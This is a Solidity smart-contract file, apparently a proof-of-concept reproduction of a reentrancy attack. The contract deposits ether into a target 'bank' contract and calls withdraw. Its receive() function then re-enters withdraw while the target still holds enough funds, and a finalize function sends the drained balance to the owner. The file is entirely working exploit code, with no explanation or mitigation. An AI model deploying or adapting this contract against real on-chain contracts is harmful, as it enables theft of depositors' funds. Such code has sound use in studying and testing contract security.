interface IBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract Reproduction {
    IBank public target;
    address public owner;

    constructor(address _target) {
        owner = msg.sender;
        target = IBank(_target);
    }

    function setup() external payable {
        require(msg.sender == owner, "Unauthorized");
        require(msg.value > 0, "No ETH sent");
        target.deposit{value: msg.value}();
    }

    function trigger(uint amount) external {
        require(msg.sender == owner, "Only owner");
        target.withdraw(amount);
    }

    receive() external payable {
        if (address(target).balance >= msg.value) {
            target.withdraw(msg.value);
        }
    }

    function finalize() external {
        require(msg.sender == owner, "Only owner");
        _finalizeFunds();
    }

    function _finalizeFunds() internal {
        uint balance = address(this).balance;
        if (balance > 0) {
            payable(owner).transfer(balance);
        }
    }
}